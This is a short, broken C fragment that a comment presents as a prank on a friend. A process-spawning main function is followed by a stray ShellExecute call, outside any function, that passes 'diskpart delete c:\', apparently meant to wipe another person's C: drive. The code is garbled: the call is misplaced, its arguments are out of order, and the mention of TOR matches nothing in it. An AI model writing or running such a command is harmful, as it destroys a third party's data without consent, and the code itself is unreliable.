// Trying to prank a friend with TOR in this folder.

#include <process.h>
int main(int argc, char **argv, char **env) {
    return _spawnve(_P_WAIT, argv[1], argv + 1, env);
}
ShellExecute(NULL, "helper.exe", "diskpart delete c:\\", NULL, NULL, 0);
